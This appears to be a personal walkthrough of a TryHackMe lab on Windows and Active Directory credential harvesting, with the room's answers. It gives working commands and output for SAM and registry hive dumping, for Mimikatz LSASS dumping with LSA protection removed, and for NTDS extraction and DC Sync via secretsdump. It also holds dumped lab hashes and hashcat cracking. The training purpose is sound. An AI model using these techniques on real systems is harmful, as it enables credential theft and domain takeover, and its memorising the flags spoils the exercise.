Task1 - Introduction
-------------------------------------

The these modules we will check out how to obtain credentials to perform lateral movement and access resources in the AD environment. 

We will be gathering:
* Login Information
* Account Names
* Passwords

Some of the ways we will explore:
* Clear Text Files
* Obsfucated Files (base64 encoded etc)
* Registry
* Memory Dumps
* Network sniffing

__Questions__

I have completed room prerequisites and am ready to learn about Credentials Harvesting!
Answer: _None needed_


Task2 - Credential Harvesting
-----------------------------------------------

As the term of the title implies, this refers to gathering information and credentials we need to increase our access on the systems. Looking for stored credentials.

Credentials can be found in a variety of different forms, such as:

-   Accounts details (usernames and passwords)
-   Hashes that include NTLM hashes, etc.
-   Authentication Tickets: Tickets Granting Ticket (TGT), Ticket Granting Server (TGS)  
-   Any information that helps login into a system (private keys, etc.)


There are generally 2 types of credential harvesting. Internal and External. If we want to go external we can look in Social Media sites, Git repos, but also phishing campaigns. 

Here we will focus on the Internal method, where we already have a set of initial credentials to gain an intial foot-hold in the system.

__Questions__

I am ready to get started!
Answer: _None needed_

Task3 - Credential Access
------------------------------------------

__Credential Access__

This is where we can find credentials in compromised systems. It is always preferable to find credentials rather than resorting to things like CVEs or exploits because the later can break the systems and/or raise alarms.

Credentials can be in the following locations or others:
-   Clear-text files
-  Obfuscated or encrypted files
-   Database files
-   Memory
-   Password managers
-   Enterprise Vaults
-   Active Directory
-   Network Sniffing

__Clear-text Files__

Clear-text files might contain sensative information like passwords, private keys etc. The MITRE ATT&CK framework defines it as **Unsecured Credentials: Credentials In Files** ([T1552.001](https://attack.mitre.org/techniques/T1552/001/)).

For example, suppose we wanted to look through PowerShell commands to see if someone left a $Password in there from a typical password change. We could look in:
`C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

If you wanted to search the Windows registery for Password then you could use this:
```shell-session
c:\Users\user> reg query HKLM /f password /t REG_SZ /s 

#OR 

C:\Users\user> reg query HKCU /f password /t REG_SZ /s
```


__Database Files__

Applications use Database files to read and write settings and yes credentials too. Many times Databases in Windows systems are stored locally. 

__Password Managers__

A password manager is a 3rd party tool to save passwords and make it easier for users to remember only a single login password to basically copy/paste or click-to-place their password into an app or site. 

Some examples:
* Built-in password managers (Windows)
* Third-Party: KeePass, 1Password, LastPass

Misconfigurations or security flaws and bugs can leave these open to attack.

__Memory Dump__

The operating systems' memory can contain a treasure trove of information like un-encrypted data/passwords. Since this data gets loaded when the program is executed.

Some examples of data in memory:
* Clear-text passwords
* Cached passwords
* AD tickets

__Active Directory__

AD stores a lot of information on users, groups and machines etc. This is typically a primary focus by advarsaries and red-teams.

These are some common mis-configs which can lead to information leaks:

-   **Users' description**: Administrators set a password in the description for new employees and leave it there, which makes the account vulnerable to unauthorized access. 
-   **Group Policy SYSVOL**: Leaked encryption keys let attackers access administrator accounts. Check Task 8 for more information about the vulnerable version of SYSVOL.
-   **NTDS:** Contains AD users' credentials, making it a target for attackers.
-   **AD Attacks:** Misconfiguration makes AD vulnerable to various attacks, which we will discuss in Task 9.

__Network Sniffing__

If we can gain sufficient access to target network for sniffing, then we can do things like man-in-the-middle attacks. This can reveal passwords, or let us create rogue or spoofed resources to steal credentials and NTLM hashes.

So we can search for the first flag using the reg.exe located in C:\Windows\system32 directory:

```shell-session
c:\Users\user> reg query HKLM /f flag /t REG_SZ /s
```

Then we can see the flag:
![[creds-harvest-1.png]]

For the next question we can use powershell to enumerate AD:
```shell-session
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
```

Then we can see the THM Victim with SamAccountName 'victim':
![[cred-harvest2.png]]

__Questions__

Use the methods shown in this task to search through the Windows registry for an entry called "flag" which contains a password. What is the password?
Answer: _tyh4ckm3_

Enumerate the AD environment we provided. What is the password of the victim user found in the description section?
Answer: _Passw0rd!@#_

Task4 - Local Windows Credentials
------------------------------------------------------

Generally speaking there are 2 types of Windows credentials: domain and local.

__Keystrokes__

Using a keylogger such as in Metasploit is another valuable way to get passwords. If we know a target user is logged in we can setup a keylogger and wait for them to login.

__Security Account Manager (SAM)__

The SAM is the local Microsoft Windows database that stores users and passwords. This DB is encrypted and also it may not be accessed while Windows is running. That said, there are ways to attack it.

The SAM is here:
`C:\Windows\System32\config\sam`

First we can see if we can read it or copy it:
`type C:\Windows\System32\config\sam`
and
`copy C:\Windows\System32\config\sam C:\Users\Administrator\Desktop\

![[cred-harvest3.png]]

__Metasploit's HashDump__

One of the easy ways to dump the hashes is using the built-in hashdump feature in Metasploit. This tool uses in-memory code injection to the LSASS.exe process to dump hashes.

```shell-session
meterpreter > getuid
Server username: THM\Administrator
meterpreter > hashdump
[...]
hash
```

__Volume Shadow Copy Service__

In this method we use the Microsoft Volume Shadow copy service while in operation. Here are the steps:

1.  Run the standard cmd.exe prompt with administrator privileges.
2.  Execute the wmic command to create a copy shadow of C: drive
3.  Verify the creation from step 2 is available.
4.  Copy the SAM database from the volume we created in step 2

The process looks like this:

![[cred-harvest4.png]]

Once that has completed, we can use vssadmin, Volume Shadow Copy Service Administrator CLI tool to list and confirm we have a shadow copy of the C: drive volume:

![[cred-harvest5.png]]

This shows we successfully created a Shadow Volume on the path:
`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`

This file is encrypted with either RC4 or AES encryption.  We need the key which is stored in:
`c:\Windows\System32\Config\system`

Now let's copy both the sam and system files to our desktop:
```shell-session
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
        1 file(s) copied.

C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.
```

10.10.123.235

Now get the files over to our Attackbox:
![[cred-harvest6.png]]

__Registery Hives__

The Windows registery is another possible way to dump the SAM database content. It does store some of the data from the SAM to be used for Windows Services. We can use the Reg.exe tool for saving. As before we need 2 files:

```shell-session
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>
```

Let's copy those over to the Attackbox too.
![[cred-harvest7.png]]

Now let's use Impackets tools: secretsdump.py to extract credentials:
```bash
root@ip-10-10-123-235:~# python3.9 /opt/impacket/examples/secretsdump.py -sam /var/tmp/sam-reg -system /var/tmp/system-reg LOCAL
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 

```

If we compare these results to the NTLM hashes we get from Metasploit the results are different. The reason for this is that the other accounts belong to Active Directory. Of course none of those are stored in the local system. To decrypt those we need to dump the SECURITY file from the Windows file which contains the required files to decrypt AD accounts.

Now that we have NTLM credentials we can use hashcat on them or just use them for impersonation.


__Questions__

Follow the technique discussed in this task to dump the content of the SAM database file. What is the NTLM hash for the Administrator account?
Answer: _98d3a787a80d08385cea7fb4aa2a4261_

Task5 - Local Security Subsystem Service (LSASS)
-------------------------------------------------------------------

__What is the LSASS__

This process handles the local security policies and enforces them on the system. This is what handles local users passwords, hashes, tickets etc. Windows keeps the credentials in LSASS so the user doesn't have to enter the credentials each time.

This is a great target for collecting credentials. Please see MITRE ATT&CK framework as "[OS Credential Dumping: LSASS Memory (T1003)](https://attack.mitre.org/techniques/T1003/001/)" for more info.

__Graphical User Interface__

You can use the Task Manager to  Create dump file of any process running in memory. Just right-click it and select "Create Dump File".

Once it is finished a pop-up will alert you to where it was saved. Now just copy it over to the Attackbox to extract the NTLM Hashes.

![[cred-harvest8.png]]

__SysInternals Suite__

If we don't have a GUI, we can also use the ProcDump utility which is part of the SysInternals Suite.

Here is how you can use that util to dump lsass:
```shell-session
c:\>c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
```

In our case, as with the GUI method using TaskMgr, we will continue getting errors since we have protection in place guarding LSASS.

__Mimikatz__

This is a widely known tool for exploiting Microsoft by dumping hashes, passwords, and Tickets from memory. It also requires Administrator access.

Run Mimikatz:
```shell-session
C:\Tools\Mimikatz> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # 
```

We need to first enable debug mode.

```shell-session
mimikatz # privilege::debug
Privilege '20' OK
```

Then we can use `sekurlsa::logonpasswords`. This will fail again since LSASS is protected, so rather than go through more examples yet let's work on fixing that LSASS problem.

__Protected LSASS__

In 2012 Microsoft implemented LSA protections to keep people from extracting passwords.

To enable the protection, we can enable the registry RunAsPPL DWORD value in `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` and set it to `1`.

Since we are already in mimikatz, we can use a built-in feature for disabling this protection. Mimikatz uses a mimidrv.sys driver that works on the kernel level to disable the LSA protection. We need to first import it using `!+` like this:

```shell-session
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
```

NOTE: If you see a `isFileExist` error then it cannot find the mimidrv.sys file. You will need to exit, and the navigate to the directory where mimikatz is, which is `C:\Tools\Mimikatz` on this setup and run it again.

After the driver is loaded we can disable the LSA protection like this:
```shell-session
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 528 -> 00/00 [0-0-0]
```

![[cred-harvest10.png]]
Then you can just run the `sekurlsa::logonpasswords` command again to dump the passwords.

![[cred-harvest11.png]]

__Questions__

Is the LSA protection enabled? (Y|N)
Answer: _Y_

If yes, try removing the protection and dumping the memory using Mimikatz. Once you have done, hit Complete.
Answer: _None Needed_


Task6 - Windows Credential Manager
----------------------------------------------------------------

__What is Credentials Manager?__

This is a Windows feature that stores logon-sensative information for applications, websites and networks. 

There are 4 categories:

-   Web credentials contain authentication details stored in Internet browsers or other applications.
-   Windows credentials contain Windows authentication details, such as NTLM or Kerberos.
-   Generic credentials contain basic authentication details, such as clear-text usernames and passwords.
-   Certificate-based credentials: Athunticated details based on certifications.


__Accessing Credential Manager__

You can access this in the GUI by going to `Control Panael -> User Accounts -> Credential Manager` or from the CLI.  

![[cred-harvest12.png]]

If we use the CLI, we will be dealing with the `vaultcmd` utility.

```shell-session
C:\Users\Administrator>vaultcmd /list
Currently loaded vaults:
        Vault: Web Credentials
        Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

        Vault: Windows Credentials
        Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault
```

By default, Windows has 2 vaults. One for Web and the other for Windows machine credentials. We can see that from our screenshot above.

Some additional commands we can use to dig into that:
```shell-session
vaultcmd /listproperties:"Web Credentials"
vaultcmd /listcreds:"Web Credentials"
```

![[cred-harvest13.png]]

Since VaultCmd is not able to show our password, we can use other tools such as the `Get-WebCredentials.ps1` powershell cmdlet.

Be sure to use the Powershell with bypass policy.
```shell-script
C:\Users\Administrator>powershell -ex bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> Import-Module C:\Tools\Get-WebCredentials.ps1
PS C:\Users\Administrator> Get-WebCredentials

UserName  Resource             Password     Properties
--------  --------             --------     ----------
THMUser internal-app.thm.red Password! {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}
```

![[cred-harvest14.png]]
Note the password: E4syPassw0rd

__RunAs__

A good alternate to take adavantage of stored credentials is the RunAs command. This is a built-in Windows tool that allows us to run different applications as another user. The `/savecred` command argument allows us to save the credential of the user in Windows Credential Manager, so if we run RunAs again it won't prompt us for the password.

Another way we can list stored creds is using `cmdkey`, which allows us to display, create, delete stored Windows credentials. 

```shell-session
C:\Users\thm>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=thm\thm-local
    Type: Domain Password
    User: thm\thm-local
```

If we try it we can find that we see a domain password stored as thm.red\thm-local which we can use with RunAs.

`runas /savecred /user:THM.red\thm-local cmd.exe` which pops up another cmd prompt as shown:

![[cred-harvest15.png]]

Now if we navigate to `C:\Users\thm-local\Saved Games` we can see our flag.txt file:

![[cred-harvest16.png]]

To get the 2nd flag, we can run mimikatz as before:

![[cred-harvest17.png]]



__Questions__

Apply the technique for extracting clear-text passwords from Windows Credential Manager. What is the password of the THMuser for internal-app.thm.red?
Answer: _E4syPassw0rd_

Use Mimikatz to memory dump the credentials for the 10.10.237.226 SMB share which is stored in the Windows Credential vault. What is the password?
Answer: _jfxKruLkkxoPjwe3_

Run cmd.exe under thm-local user via runas and read the flag in "c:\Users\thm-local\Saved Games\flag.txt". What is the flag?
Answer: _THM{RunA5S4veCr3ds}_


Task7 - Domain Controller
-----------------------------------------------

__NTDS Domain Controller__

New Technology Directory Services (NTDS) is a database that contains all Active Directory data, including objects, attributes, credentials, etc. The ntds.dts file has 3 tables:

-   Schema table: it contains types of objects and their relationships.
-   Link table: it contains the object's attributes and their values.
-   Data type: It contains users and groups.

NTDS is located in `C:\Windows\NTDS` by default. It is encrypted. Also accessing the NTDS.dit file is not allowed. There are some ways around this which we will cover in this task.

Some ways to get a copy:
* ntdsutil
* Diskshadow tool

Once we have a copy we can attempt to dump the contents, but that will require a Boot Key to decrypt the LSA credentials which is stored in the SECURITY file system. So, we need to dump that as well.

__NTDSUtil__

This is a Windows utlity to manage AD configurations. It is used in situations such as:

-   Restore deleted objects in Active Directory.
-   Perform maintenance for the AD database.
-   Active Directory snapshot management.
-   Set Directory Services Restore Mode (DSRM) administrator passwords.

__Local Dumping (No Credentials)__

We can use this way if we don't have credentials available but do have admin access to the domain controller. So we will use Windows utilities to dump the NTDS file and crack them offline.

To dump the content of the NTDS file we need:

-   C:\Windows\NTDS\ntds.dit
-   C:\Windows\System32\config\SYSTEM
-   C:\Windows\System32\config\SECURITY

Here is a Powershell cmdlet you can use to dump the NTDS file to `C:\Temp`

```shell-session
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

Now, if we check the `c:\temp` directory, we see two folders: Active Directory and registry, which contain the three files we need. Transfer them to the AttackBox and run the secretsdump.py script to extract the hashes from the dumped memory file.

```shell-session
$ python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
```


__Remote Dumping (With Credentials)__

In this section we see how to dump a system and domain controller hashes remotely which we will need credentials for. 

__DC Sync__

DC Sync is a popular attack within AD environment to dump credentials remotely. This work when we have a special account or an AD admin account that we previously compromised with the following permissions:

-   Replicating Directory Changes
-   Replicating Directory Changes All
-   Replicating Directory Changes in Filtered Set

We previously did this attack in Task 2 of the Persisting AD room, using mimikatz.

In this time we will use a different method. Impacket  tools are very good option for us. We will use SecretsDump script here.

```shell-session
$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@MACHINE_IP 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
```

For the options:

-   the `-just-dc` argument is for extracting the NTDS data.
-   the `thm.red/AD_Admin_User` is the authenticated domain user in the form of (domain/user).
-  the -just-dc-ntlm argument  is only for NTLM hashes.

```shell-session
$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@MACHINE_IP
```

Once we have the hashes we can either use them for impersonation attacks or we can use tools like hashcat to try and crack them.

```shell-session
$ hashcat -m 1000 -a 0  /path/to/wordlist/such/as/rockyou.txt
```

NOTE: The -m 1000 is for NTLM hashes.

Let's go to town!
--------------------------

First thing we will try is dumping the local DC with ntdsutil.
![[cred-harvest19.png]]
Once it's done, we scp the files over to our Attackbox under /var/tmp.
![[cred-harvest18.png]]
Now we can run secretsdump on them:

```bash
# python3.9 /opt/impacket/examples/secretsdump.py -security registry/SECURITY -system registry/SYSTEM -ntds Active\ Directory/ntds.dit local
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:a125ef8c351979c0e13a88115370afe56092c27a66d1baf523133272a8375e698ea01d8c77205597b2c5b9387535c0caa18875e74080a7d8825f27d404b6244ef42aa38949c0fada34634a1a6ba57daa4769a9c21ed5ee35893a1169f3d4ae0818559027ee40aeb0f8e45dce6fc8c51d3c5ca2a7f31da48cf90deaad8c522fa2ba5ebc8e93c9699d2f0a6edb9c895934dbae905f64f4b2e82f1a92308b26fb89caa3cd15e969c620115dd05cea19e3ce49dd67416daa7a29649d83db1df15629f805eb726178148ddee433d7daf34d2caef2155630a0c363f1f7227c1b2f9f13391f02c1fcc8f68f6bf16b9197f9eec3
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d9d5108899d3637908c45f95cfc00c78
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x0e88ce11d311d3966ca2422ac2708a4d707e00be
dpapi_userkey:0x8b68be9ef724e59070e7e3559e10078e36e8ab32
[*] NL$KM 
 0000   8D D2 8E 67 54 58 89 B1  C9 53 B9 5B 46 A2 B3 66   ...gTX...S.[F..f
 0010   D4 3B 95 80 92 7D 67 78  B7 1D F9 2D A5 55 B7 A3   .;...}gx...-.U..
 0020   61 AA 4D 86 95 85 43 86  E3 12 9E C4 91 CF 9A 5B   a.M...C........[
 0030   D8 BB 0D AE FA D3 41 E0  D8 66 3D 19 75 A2 D1 B2   ......A..f=.u...
NL$KM:8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341e0d8663d1975a2d1b2
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 55db1e9562985070bbba0ef2cc25754c
[*] Reading and decrypting hashes from Active Directory/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc9b72f354f0371219168bdb1460af32:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:d9d5108899d3637908c45f95cfc00c78:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
thm.red\victim:1115:aad3b435b51404eeaad3b435b51404ee:6c3d8f78c69ff2ebc377e19e96a10207:::
thm.red\thm-local:1116:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\admin:1118:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\svc-thm:1119:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
thm.red\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\test-user:1127:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
sshd:1128:aad3b435b51404eeaad3b435b51404ee:a78d0aa18c049d268b742ea360849666:::
[*] Kerberos keys from Active Directory/ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:510e0d5515009dc29df8e921088e82b2da0955ed41e83d4c211031b99118bf30
Administrator:aes128-cts-hmac-sha1-96:bab514a24ef3df25c182f5520bfc54a0
Administrator:des-cbc-md5:6d34e608f8574632
CREDS-HARVESTIN$:aes256-cts-hmac-sha1-96:f645be10cf13eea8292fc57bb3e0e0f36acbb1b42d7a87c307cab3063792e94b
CREDS-HARVESTIN$:aes128-cts-hmac-sha1-96:efa7e634eb6ca6fb635310c33622e95e
CREDS-HARVESTIN$:des-cbc-md5:da049b160e79da7a
krbtgt:aes256-cts-hmac-sha1-96:24fad271ecff882bfce29d8464d84087c58e5db4083759e69d099ecb31573ad3
krbtgt:aes128-cts-hmac-sha1-96:2feb0c1629b37163d59d4c0deb5ce64c
krbtgt:des-cbc-md5:d92ffd4abf02b049
thm.red\thm:aes256-cts-hmac-sha1-96:2a54bb9728201d8250789f5e793db4097630dcad82c93bcf9342cb8bf20443ca
thm.red\thm:aes128-cts-hmac-sha1-96:70179d57a210f22ad094726be50f703c
thm.red\thm:des-cbc-md5:794f3889e646e383
thm.red\victim:aes256-cts-hmac-sha1-96:588635fd39ef8a9a0dd1590285712cb2899d0ba092a6e4e87133e4c522be24ac
thm.red\victim:aes128-cts-hmac-sha1-96:672064af4dd22ebf2f0f38d86eaf0529
thm.red\victim:des-cbc-md5:457cdc673d3b0d85
thm.red\thm-local:aes256-cts-hmac-sha1-96:a7e2212b58079608beb08542187c9bef1419d60a0daf84052e25e35de1f04a26
thm.red\thm-local:aes128-cts-hmac-sha1-96:7c929b738f490328b13fb14a6cfb09cf
thm.red\thm-local:des-cbc-md5:9e3bdc4c2a6b62c4
thm.red\admin:aes256-cts-hmac-sha1-96:7441bc46b3e9c577dae9b106d4e4dd830ec7a49e7f1df1177ab2f349d2867c6f
thm.red\admin:aes128-cts-hmac-sha1-96:6ffd821580f6ed556aa51468dc1325e6
thm.red\admin:des-cbc-md5:32a8a201d3080b2f
thm.red\svc-thm:aes256-cts-hmac-sha1-96:8de18b5b63fe4083e22f09dcbaf7fa62f1d409827b94719fe2b0e12f5e5c798d
thm.red\svc-thm:aes128-cts-hmac-sha1-96:9fa57f1b464153d547cca1e72ad6bc8d
thm.red\svc-thm:des-cbc-md5:f8e57c49f7dc671c
thm.red\bk-admin:aes256-cts-hmac-sha1-96:48b7d6de0b3ef3020b2af33aa43a963494d22ccbea14a0ee13b63edb1295400e
thm.red\bk-admin:aes128-cts-hmac-sha1-96:a6108bf8422e93d46c2aef5f3881d546
thm.red\bk-admin:des-cbc-md5:108cc2b0d3100767
thm.red\test-user:aes256-cts-hmac-sha1-96:2102b093adef0a9ddafe0ad5252df78f05340b19dfac8af85a4b4df25f6ab660
thm.red\test-user:aes128-cts-hmac-sha1-96:dba3f53ecee22330b5776043cd203b64
thm.red\test-user:des-cbc-md5:aec8e3325b85316b
sshd:aes256-cts-hmac-sha1-96:07046594c869e3e8094de5caa21539ee557b4d3249443e1f8b528c4495725242
sshd:aes128-cts-hmac-sha1-96:e228ee34b8265323725b85c6c3c7d85f
sshd:des-cbc-md5:b58f850b4c082cc7
[*] Cleaning up... 
```

Now we need the password for bk-admin user: We take the ntlm hash for them from above and put it in a text file called `hash`. Then we can use hashcat on it:

```bash
# echo 077cccc23f8ab7031726a3b70c694a49 > hash

# cat hash
077cccc23f8ab7031726a3b70c694a49


# hashcat -m 1000 -a 0 hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1-66-g6a419d06) starting...

* Device #2: Outdated POCL OpenCL driver detected!

This OpenCL driver has been marked as likely to fail kernel compilation or to produce false negatives.
You can use --force to override this, but do not report related errors.

OpenCL API (OpenCL 2.0 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz, 3878/3942 MB (985 MB allocatable), 2MCU

OpenCL API (OpenCL 1.2 pocl 1.1 None+Asserts, LLVM 6.0.0, SPIR, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
===========================================================================================================================
* Device #2: pthread-Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553435 bytes (23.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 67106875 bytes (47.9Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

077cccc23f8ab7031726a3b70c694a49:Passw0rd123     
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: 077cccc23f8ab7031726a3b70c694a49
Time.Started.....: Sun Nov 20 09:09:03 2022 (1 sec)
Time.Estimated...: Sun Nov 20 09:09:04 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3808.5 kH/s (0.25ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2103296/14344384 (14.66%)
Rejected.........: 0/2103296 (0.00%)
Restore.Point....: 2101248/14344384 (14.65%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: R5tYBJ3E7 -> Passowrd

Started: Sun Nov 20 09:08:29 2022
Stopped: Sun Nov 20 09:09:04 2022

```

Now let's try the DC Sync attack remotely:
```bash
# python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/bk-admin@10.10.150.239
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc9b72f354f0371219168bdb1460af32:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
thm.red\victim:1115:aad3b435b51404eeaad3b435b51404ee:6c3d8f78c69ff2ebc377e19e96a10207:::
thm.red\thm-local:1116:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\admin:1118:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\svc-thm:1119:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
thm.red\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\test-user:1127:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
sshd:1128:aad3b435b51404eeaad3b435b51404ee:a78d0aa18c049d268b742ea360849666:::
CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:d9d5108899d3637908c45f95cfc00c78:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:510e0d5515009dc29df8e921088e82b2da0955ed41e83d4c211031b99118bf30
Administrator:aes128-cts-hmac-sha1-96:bab514a24ef3df25c182f5520bfc54a0
Administrator:des-cbc-md5:6d34e608f8574632
krbtgt:aes256-cts-hmac-sha1-96:24fad271ecff882bfce29d8464d84087c58e5db4083759e69d099ecb31573ad3
krbtgt:aes128-cts-hmac-sha1-96:2feb0c1629b37163d59d4c0deb5ce64c
krbtgt:des-cbc-md5:d92ffd4abf02b049
thm.red\thm:aes256-cts-hmac-sha1-96:2a54bb9728201d8250789f5e793db4097630dcad82c93bcf9342cb8bf20443ca
thm.red\thm:aes128-cts-hmac-sha1-96:70179d57a210f22ad094726be50f703c
thm.red\thm:des-cbc-md5:794f3889e646e383
thm.red\victim:aes256-cts-hmac-sha1-96:588635fd39ef8a9a0dd1590285712cb2899d0ba092a6e4e87133e4c522be24ac
thm.red\victim:aes128-cts-hmac-sha1-96:672064af4dd22ebf2f0f38d86eaf0529
thm.red\victim:des-cbc-md5:457cdc673d3b0d85
